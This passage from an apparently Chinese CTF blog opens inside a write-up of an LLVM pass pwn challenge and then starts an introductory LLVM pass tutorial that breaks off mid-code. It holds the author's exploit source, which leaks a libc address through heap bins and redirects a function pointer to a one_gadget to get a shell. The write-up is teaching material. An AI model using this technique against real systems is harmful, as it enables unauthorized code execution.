<code>if ( -1431655765 * (unsigned int)((v15 + 24 * v38 - 24 * (unsigned __int64)v39 - v40) &gt;&gt; 3) != 1 )</code><br />
设置其有一个参数即可通过该检查。</p>
<p>于是有第三个测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">	takeaway(<span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey();</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@.str = private unnamed_addr constant [7 x i8] c&quot;123456\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [7 x i8] c&quot;654321\00&quot;, align 1</span><br><span class="line">@.str.2 = private unnamed_addr constant [7 x i8] c&quot;abcdef\00&quot;, align 1</span><br><span class="line">@.str.3 = private unnamed_addr constant [7 x i8] c&quot;fedcba\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [7 x i8] c&quot;888888\00&quot;, align 1</span><br><span class="line">@.str.5 = private unnamed_addr constant [7 x i8] c&quot;follow\00&quot;, align 1</span><br><span class="line">@.str.6 = private unnamed_addr constant [11 x i8] c&quot;helloworld\00&quot;, align 1</span><br><span class="line">@.str.7 = private unnamed_addr constant [6 x i8] c&quot;colin\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @save(i8*, i8*) #0 &#123;</span><br><span class="line">  %3 = alloca i8*, align 8</span><br><span class="line">  %4 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %3, align 8</span><br><span class="line">  store i8* %1, i8** %4, align 8</span><br><span class="line">  %5 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local i32 @printf(i8*, ...) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @takeaway(i8*) #0 &#123;</span><br><span class="line">  %2 = alloca i8*, align 8</span><br><span class="line">  store i8* %0, i8** %2, align 8</span><br><span class="line">  %3 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @stealkey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @fakekey() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local void @run() #0 &#123;</span><br><span class="line">  %1 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0))</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @B4ckDo0r() #0 &#123;</span><br><span class="line">  call void @save(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))</span><br><span class="line">  call void @takeaway(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0))</span><br><span class="line">  call void @stealkey()</span><br><span class="line">  call void @fakekey()</span><br><span class="line">  call void @run()</span><br><span class="line">  ret i32 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line">attributes #1 = &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;=&quot;false&quot; &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;no-frame-pointer-elim&quot;=&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;false&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;clang version 8.0.1-9 (tags/RELEASE_801/final)&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>进入调试后发现在takeaway中某处会产生段错误，原因不明。暂且删除takeaway的调用，跳过。</p>
<p>在stealkey中，发现在语句<code>byte_204100 = *key_chunk;</code>（key_chunk就是.so中偏移0x2040F8的位置）执行前，之前save创建的chunk中保存的是一个chunk的地址，里面有save函数的两个实参的值。然后stealkey将这个chunk中的前8字节取了出来保存。</p>
<p><img src="4.png" alt="" /><br />
后面的fakekey同样需要传入一个参数，因此有第四个测试代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;follow&quot;</span>, <span class="string">&quot;helloworld&quot;</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经调试发现，fakekey中关键操作前面的判断通不过，对关键地址没有任何影响：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v75 + <span class="number">16LL</span>) == <span class="number">13</span> )</span><br><span class="line">  SExtValue = llvm::APInt::<span class="built_in">getSExtValue</span>((llvm::APInt *)(*(_QWORD *)v75 + <span class="number">24LL</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  SExtValue = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure>
<p>由于getSExtValue的含义是get signed extended value，获得有符号扩展的数，推测与参数有关，既然是数，猜测参数对类型有要求：必须是一个整数。于是修改了fakekey的参数类型，再次尝试。</p>
<p><img src="5.png" alt="" /><br />
成功通过判断条件。随后的getSExtValue函数确实返回了fakekey的第一个参数值，并将关键地址处的值加上了这个参数值。随后的run函数中就以该地址的值作为函数指针调用。由此，流程分析基本完成，思路逐渐清晰。</p>
<p>现在我们已知能够控制一个函数指针的值。本题给出的libc是2.27版本，可以使用one_gadget工具获取one_gadget，在此之后还有一个问题：如何获取libc的基地址并保存到这个地址中？要知道，我们能够任意修改key_chunk中值的唯二的方法是：①通过save函数的第一个参数修改；②通过fakekey函数的第一个参数修改。但是别忘了，key_chunk保存的是一个chunk指针，既然是chunk就有可能分配到原来是free chunk的chunk。如果这原来是一个unsorted bin chunk，那么fd指针处保存的不就正是main_arena处的地址吗？如果我们将save函数的第一个参数设置为’\x00’，由于memcpy函数拷贝的长度是根据字符串的长度来计算，因此save函数此时就不会覆盖这里的地址值，我们也就能够获取到main_arena中的地址了。以此为基础使用fakekey函数加上一个值让它指向one_gadget，这不就成了吗？</p>
<p><img src="6.png" alt="" /><br />
这是程序遍历到B4ckDo0r函数的时候的bins情况，发现0x20大小的tcache bin中有7个chunk。可以先将这7个分配出来，然后就可以通过切割unsorted bin的方式拿到main_arena的地址。</p>
<p>在给出的libc中，main_arena的偏移为0x3EBC40，unsorted bin的链表头地址为0x3EBCB0。以下面的libc来计算偏移。当然由于笔者是在ubuntu 20.04上面调试，因此使用本机的libc计算偏移，看看能不能在2.31的环境下打通。</p>
<p><img src="7.png" alt="" /><br />
在笔者的libc中，unsorted bin链表头地址为0x1ECBF0，one_gadget如下：<br />
<img src="8.png" alt="" /><br />
于是有下面的脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;123456&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">takeaway</span><span class="params">(<span class="type">char</span>* a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;654321&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">stealkey</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;abcdef&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fakekey</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a)</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;fedcba&quot;</span>);&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;<span class="built_in">printf</span>(<span class="string">&quot;888888&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">B4ckDo0r</span><span class="params">()</span>&#123;</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	save(<span class="string">&quot;colin&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	save(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;colin&quot;</span>);</span><br><span class="line">	stealkey();</span><br><span class="line">	fakekey(<span class="number">-0x1090F2</span>);</span><br><span class="line">	run();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="9.png" alt="" /></p>
<p>成功getshell。</p>
<p>历经艰难困苦，这道题总算是做出来了（这篇文章是笔者花了三天时间才写出来的）。通过本题我们需要注意一些关键函数的使用和一些条件控制信息的识别，就如上面提到的调用什么函数说明可能要进行参数个数的检查，调用上面函数说明可能对参数的类型有要求等等。当然做这类题目也是对我们逆向C++程序能力的训练，值得仔细深究。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">LLVM pass pwn 入门 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:35:40" itemprop="dateCreated datePublished" datetime="2023-02-28T22:35:40+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:43" itemprop="dateModified" datetime="2023-03-01T11:30:43+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/llvm-pass-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">llvm pass pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。</p>
<p>首先，既然要研究LLVM，就要清楚LLVM到底是什么。</p>
<blockquote>
<p>它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。（摘自<a target="_blank" rel="noopener" href="https://blog.csdn.net/yayaayaya123/article/details/83993041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165728197316781818799638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=165728197316781818799638&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83993041-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&amp;utm_term=LLVM&amp;spm=1018.2226.3001.4187">资料</a>）</p>
</blockquote>
<p>LLVM在编译过程中实际上发挥了一个牵线搭桥的作用。高级语言多种多样，但无论是哪一种语言的编译器，都需要对高级语言编写的代码进行词法与句法分析，这是编译器前端部分的工作。在分析完成后，前端会输出一个抽象语法树AST，由LLVM进行分析与优化，转化为中间表示IR。再由编译器后端根据IR生成可供执行的二进制代码。</p>
<blockquote>
<p>而pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。<br />
大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。（摘自<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>）</p>
</blockquote>
<p>下面，笔者使用Ubuntu 20.04系统进行第一个LLVM pass的编写测试。</p>
<p>首先安装Clang：<code>apt install clang</code>，在Ubuntu 20.04安装clang会附带安装llvm-9和llvm-10，经过测试发现，只有llvm-10能够正常使用，用llvm-9的库编译会报错。</p>
<p>这里借<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>中的测试代码编写：</p>
<p>myFirstLLVMpass.cpp:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span><span class="comment">//写Pass所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span><span class="comment">//操作函数所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span><span class="comment">//打印输出所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//声明匿名空间，被声明的内容仅在文件内部可见</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//注册类Hello，第一个参数是命令行参数，第二个参数是名字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure>
<p>上面就是LLVM pass的C++代码了。我们需要一个C语言文件，这个文件中的内容无关紧要，这里用笔者做kernel pwn题中的一个文件为例：</p>
<p>firstLLVMtest.c:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span 